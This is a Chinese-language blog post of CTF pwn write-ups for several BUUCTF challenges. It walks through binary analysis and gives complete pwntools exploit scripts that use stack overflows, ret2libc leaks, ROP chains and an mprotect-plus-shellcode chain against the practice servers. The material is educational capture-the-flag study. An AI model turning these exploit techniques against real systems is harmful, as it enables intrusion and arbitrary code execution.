<h2 id="checksec和查看运行流程"><a href="#checksec和查看运行流程" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727092413681.png?raw=true" alt="image-20210727092413681.png"></p>
<p>32位的程序，并且开启了RELRO和NX。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727092511536.png?raw=true" alt="image-20210727092511536.png"></p>
<p>运行的时候什么提示也没有，就是让我们输入一次（以回车结尾），发现输入过多会有回显，但回显的内容看不出什么。</p>
<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727093341529.png?raw=true" alt="image-20210727093341529.png"></p>
<p>在main中看不出什么，进入第一个函数sub_804871f。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727093549469.png?raw=true" alt="image-20210727093549469.png"></p>
<p>这里返回的buf[7]很重要。</p>
<p>​    <img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727093658756.png?raw=true" alt="image-20210727093658756.png"></p>
<p>总结一下我们发现的：</p>
<p>1.本题没有存在程序自带的get_shell       –&gt;     也就说可能要泄露libc或者写入shellcode，但开启了NX可能就只有泄露Libc的方法了。</p>
<p>2.本题存在栈溢出漏洞，但是有条件      –&gt;        要有办法能够修改buf【7】的值。</p>
<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><p>我们可以尝试一下倒着构思：<br>第二次栈溢出时我们利用栈溢出漏洞来跳转并运行到我们泄露的libc中的system&lt;———-先第一次利用栈溢出漏洞泄露libc地址&lt;——-我们可以通过覆盖来修改buf[7]的值达到修改a1的效果，使得栈溢出漏洞生效&lt;————如何绕过比较的strlen函数？我们可以用刚刚小课堂的知识中学到的<strong>\x00</strong>来绕过检查&lt;——–我们分析了buf数组的结构，发现buf改好有32字节，数组的大小为8（下标为0-7），也就是说我们需要覆盖的buf[7]也在可以覆盖的范围内</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29682)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;babyrop&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">func_addr &#x3D; 0x80487D0</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\x00&#39; + &#39;\xff&#39;*7</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Correct\n&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0xe7 + p32(0) + p32(write_plt) + p32(func_addr) + p32(1) + p32(read_got) +p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_got_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print hex(read_got_addr)</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_got_addr)</span><br><span class="line">libc_base &#x3D; read_got_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0xe7 + p32(0) + p32(system_addr) + p32(0) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.学到了绕过strlen和strncmp这类函数</p>
<p>2.了解了关于数组的概念</p>
<p>3.发现当我尝试利用puts泄露地址的时候，是不能完成的。因为我们程序中没有出现puts函数，所以plt和got表中没有puts函数的地址。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727095519132.png?raw=true" alt="image-20210727095519132.png"></p>
<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><h2 id="checksec和运行流程"><a href="#checksec和运行流程" class="headerlink" title="checksec和运行流程"></a>checksec和运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727095755287.png?raw=true" alt="image-20210727095755287.png"></p>
<p>是32位的程序，保护基本全开。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727095844447.png?raw=true" alt="image-20210727095844447.png"></p>
<p>让我们输入一次，并且我们尝试之后发现当输出的内容过多时会出现回显并且泄露了一个值。</p>
<h2 id="利用IDA分析-1"><a href="#利用IDA分析-1" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727095702453.png?raw=true" alt="image-20210727095702453.png"></p>
<p>我们发现当var[13]==17的时候我们就可以跳转到get_shell，并且这里又是一个数组类的修改，这里我们发现scanf的输入形式非常的奇怪后面的v4,v5为什么要出现呢？网上也没有找到解释，但我们初步看出这里的数组大小为15.（因为底下显示的var[0-14]）</p>
<p>尝试写exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29883)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_8&#39;)</span><br><span class="line">p.recvline(&#39;name?&#39;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; p32(17)*15</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但我们发现这样是不能打通的，于是我去虚心求学了一下</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25672)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_8&#39;)</span><br><span class="line">p.recvline(&#39;name?&#39;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload &#x3D; p32(17)*14</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>网上只构造了14个，明明数组有15个为什么不能多打一个呢？</p>
<p>然后我开始自己迷惑自己</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727095702453.png?raw=true" alt="image-20210727095702453.png"></p>
<p>还记得刚开始我们看到的内容吗？我们画图来看看他们之间得关系</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210727102630600.png?raw=true" alt="image-20210727102630600.png"></p>
<p>有点丑，不过我们大概可以看出来范围是：edp-1ch到esp-14h。即为0x30h，并且加上开头和结尾的地址也就是14个数组地址，所以并没有var[14]所以我们不能*15.</p>
<p>但当我看到下面的exp我沉默了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25672)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_8&#39;)</span><br><span class="line">p.recvline(&#39;name?&#39;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload &#x3D; p32(17)*14+p32(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我上面就是在自欺欺人，我也不太懂为什么会这样。</p>
<h2 id="get-started-3dsctf-2016-1"><a href="#get-started-3dsctf-2016-1" class="headerlink" title="get_started_3dsctf_2016 1"></a>get_started_3dsctf_2016 1</h2><h2 id="checksec并查看运行流程"><a href="#checksec并查看运行流程" class="headerlink" title="checksec并查看运行流程"></a>checksec并查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730093706798.png?raw=true" alt="image-20210730093706798.png"></p>
<p>32位的程序，只开了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730093951016.png?raw=true" alt="image-20210730093951016.png"></p>
<p>运行的时候只有一次输入，然后就结束。</p>
<h2 id="利用IDA分析查看"><a href="#利用IDA分析查看" class="headerlink" title="利用IDA分析查看"></a>利用IDA分析查看</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730094111226.png?raw=true" alt="image-20210730094111226.png"></p>
<p>发现这题和之前做的都不一样，这次的函数比以往的都多，我刚开始一下子还找不到main函数。</p>
<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们在IDA里按住shift+f4可以跳转到函数界面，然后按ctrl+f可以进行查询函数 		--这个技巧在往后都很有效</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730094349054.png?raw=true" alt="image-20210730094349054.png"></p>
<p>进入mian函数后发现存在明显的栈溢出漏洞。</p>
<h2 id="构思-1"><a href="#构思-1" class="headerlink" title="构思"></a>构思</h2><p>我们现在已知一个栈溢出漏洞，那么我们应该跳转到哪里去呢？</p>
<p>我们进行下面的尝试：</p>
<h3 id="1-直接跳转程序中的shell或可以直接提取flag的函数中"><a href="#1-直接跳转程序中的shell或可以直接提取flag的函数中" class="headerlink" title="1.直接跳转程序中的shell或可以直接提取flag的函数中"></a>1.直接跳转程序中的shell或可以直接提取flag的函数中</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730095408715.png?raw=true" alt="image-20210730095408715.png"></p>
<p>我们在查找时发现存在这样的函数，我们就可以进行尝试直接用栈溢出跳转。</p>
<h3 id="2-我们可以利用函数传递的特性"><a href="#2-我们可以利用函数传递的特性" class="headerlink" title="2.我们可以利用函数传递的特性"></a>2.我们可以利用函数传递的特性</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730095527986.png?raw=true" alt="image-20210730095527986.png"></p>
<p>我们发现我们如果跳转到flag中的话，需要满足上述的两个条件才能读取到flag文件的内容，那么我们怎么控制a1,a2两个参数。</p>
<h3 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们在进行带参数的函数跳转时，栈布局如下：</span><br><span class="line">目标函数+目的函数的返回地址（完成目标函数后）+参数1+参数2+.....</span><br><span class="line">那么如果我们要完成的话就要使得栈布局如下：</span><br><span class="line">p32(get_flag) + p32(返回地址) + p32(0x308cd64f) + p32(0x195719D1)</span><br></pre></td></tr></table></figure>

<h3 id="3-利用mprotect函数的特性修改权限"><a href="#3-利用mprotect函数的特性修改权限" class="headerlink" title="3.利用mprotect函数的特性修改权限"></a>3.利用mprotect函数的特性修改权限</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730100109851.png?raw=true" alt="image-20210730100109851.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mprotect函数的介绍：</span><br><span class="line">int mprotect(const void *start, size_t len, int prot);</span><br><span class="line"></span><br><span class="line">　　第一个参数填的是一个地址，是指需要进行操作的地址。</span><br><span class="line"></span><br><span class="line">　　第二个参数是地址往后多大的长度。</span><br><span class="line"></span><br><span class="line">　　第三个参数的是要赋予的权限。</span><br><span class="line"></span><br><span class="line">　　mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span><br><span class="line"></span><br><span class="line">　　嗯。。。还是上面这一句话讲的明白...</span><br><span class="line"></span><br><span class="line">　　prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span><br><span class="line"></span><br><span class="line">　　1）PROT_READ：表示内存段内的内容可写；</span><br><span class="line"></span><br><span class="line">　　2）PROT_WRITE：表示内存段内的内容可读；</span><br><span class="line"></span><br><span class="line">　　3）PROT_EXEC：表示内存段中的内容可执行；</span><br><span class="line"></span><br><span class="line">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span><br><span class="line"></span><br><span class="line">　　prot&#x3D;7 是可读可写可执行    #这个是个知识点。。。我是没找到出处，我唯一能想到的就是师傅在调试的过程发现第三个参数等于7是赋给的内存地址权限是可读可写可执行叭。</span><br><span class="line"></span><br><span class="line">　　需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</span><br></pre></td></tr></table></figure>

<p>我们这里介绍一下怎么选择mprotect选择的开始地址：<br>1.我们首先打开gdb</p>
<p>2.run，之后切断</p>
<p>3.输入vmmap</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730100330938.png?raw=true" alt="image-20210730100330938.png"></p>
<p>这里的开始地址的话，我们一般选用的是红色框中的地址，可以在0x80ea000到0x80ec000之间选择，一般选择的为整数（0x1000的倍数）.</p>
<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><p>第一种直接跳转</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26554)</span><br><span class="line">get_flag &#x3D; 0x80489a0</span><br><span class="line">exit &#x3D; 0x0804e6a0</span><br><span class="line">p.recvuntil(&#39;Qual a palavrinha magica?&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x38 + p32(0x80489cc)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#sleep(0.1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>发现并不能完成我们的目的，可能是我们输入的目的地址不能够直接获得flag。</p>
<p>第二种方法，带参数的函数传递：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26554)</span><br><span class="line">get_flag &#x3D; 0x80489a0</span><br><span class="line">exit &#x3D; 0x0804e6a0</span><br><span class="line">p.recvuntil(&#39;Qual a palavrinha magica?&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x38 + p32(0x80489a0) + p32(0x0804e6a0) + p32(0x308CD64F) + p32(0x195719D1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#sleep(0.1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>第三种方法，mprotect函数的运用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,28976)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">get_flag &#x3D; 0x80489a0</span><br><span class="line">exit &#x3D; 0x0804e6a0</span><br><span class="line">mprotect &#x3D; 0x0806ec80</span><br><span class="line">pop_ret &#x3D; 0x0809e4c5</span><br><span class="line">start &#x3D; 0x80ea000</span><br><span class="line">read_addr &#x3D; 0x0806e140</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x38 </span><br><span class="line">payload +&#x3D; p32(mprotect) + p32(pop_ret) + p32(start) + p32(0x2000) + p32(0x7)</span><br><span class="line">payload +&#x3D; p32(read_addr) + p32(start)+ p32(0) + p32(start) + p32(0x100)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh(),arch&#x3D;&#39;i386&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>1.了解到mprotect函数的运用</p>
<p>2.知道带参数的函数跳转时的栈布局（这里只针对32位）</p>
<p>3.如何生成shellcode</p>
<h2 id="ciscn-2019-en-2-1"><a href="#ciscn-2019-en-2-1" class="headerlink" title="ciscn_2019_en_2 1"></a>ciscn_2019_en_2 1</h2><h2 id="checksec和查看运行流程-1"><a href="#checksec和查看运行流程-1" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730101413834.png?raw=true" alt="image-20210730101413834.png"></p>
<p>64位的程序，只开了NX。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730101504241.png?raw=true" alt="image-20210730101504241.png"></p>
<p>程序有三个功能，其中功能2不能使用。功能1中可以进行一次输入，并且输出一次内容（内容很奇怪）。</p>
<h2 id="利用IDA分析-2"><a href="#利用IDA分析-2" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730101700557.png?raw=true" alt="image-20210730101700557.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730101910787.png?raw=true" alt="image-20210730101910787.png"></p>
<p>通过分析之后我们发现这里存在明显的栈溢出漏洞。</p>
<h2 id="构思-2"><a href="#构思-2" class="headerlink" title="构思"></a>构思</h2><p>查看程序中是否存在可以利用的函数：</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730102003035.png?raw=true" alt="image-20210730102003035.png"></p>
<p>我们一番查看之后发现并没有什么有用的内容，那么我们就只能自己构造一个调用。</p>
<p>如何构造调用：<br>1.泄露地址</p>
<p>2.利用泄露的地址get_shell</p>
<h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们要知道我们的程序是64位的，那么我们的参数传递是通过寄存器传递的，那么我们就需要pop来完成。</span><br><span class="line">利用语句：</span><br><span class="line">ROPgadget --binary 文件名 --only &#39;pop|ret&#39;来查找适合的语句。</span><br></pre></td></tr></table></figure>



<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26239)</span><br><span class="line">p &#x3D; process(&#39;ciscn_2019_en_2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;ciscn_2019_en_2&#39;)</span><br><span class="line"></span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">ret &#x3D;  0x00000000004006b9</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400c83</span><br><span class="line">pop_rsi &#x3D; 0x0000000000400c81</span><br><span class="line">encrpt &#x3D; 0x4009a0</span><br><span class="line">main_addr &#x3D; 0x400b28</span><br><span class="line">p.recvuntil(&#39;Input your choice!\n&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Input your Plaintext to be encrypted\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_got_addr &#x3D; u64(p.recvuntil(&#39;\n&#39;)[:-1].ljust(8,&#39;\0&#39;))</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_got_addr)</span><br><span class="line">libc_base &#x3D; puts_got_addr - libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">p.sendlineafter(&#39;choice!\n&#39;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x58 + p64(ret) +p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sleep(0.1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1.泄露地址中的地址需要程序中出现过的函数，如本题中出现的是puts。</p>
<p>2.64位程序的参数传递，如何布局和利用</p>
<p>3.熟练的掌握LibcSeacher的使用</p>
<h1 id="2020-babystack"><a href="#2020-babystack" class="headerlink" title="2020_babystack"></a>2020_babystack</h1><h2 id="checksec和查看程序运行流程"><a href="#checksec和查看程序运行流程" class="headerlink" title="checksec和查看程序运行流程"></a>checksec和查看程序运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730102827179.png?raw=true" alt="image-20210730102827179.png"></p>
<p>64位程序，只开了NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730103119126.png?raw=true" alt="image-20210730103119126.png"></p>
<p>程序中，我们可以进行两次输入但没有回显。</p>
<h2 id="利用IDA分析-3"><a href="#利用IDA分析-3" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/main/BUU%E5%88%B7%E9%A2%98-1/image-20210730103935312.png?raw=true" alt="image-20210730103935312.png"></p>
<p>第一次输入的时候我们这里定义的就是我们第二次读取的大小。</p>
<p>那么结合第一次，第二次输入     —–&gt;    就可以造成一个栈溢出漏洞</p>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27924)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;2020_babystack&#39;)</span><br><span class="line">system_addr &#x3D; 0x4003e1</span><br><span class="line">bin_sh_addr &#x3D; 0x400858</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400833</span><br><span class="line">pop_rsi &#x3D; 0x0000000000400831</span><br><span class="line">backdoor &#x3D; 0x4006e6</span><br><span class="line">p.recvuntil(&#39;your name:\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(&#39;100&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;What&#39;s u name?\n&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x10 + p64(0) + p64(backdoor)			--可以利用shift+f12看到存在后门函数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

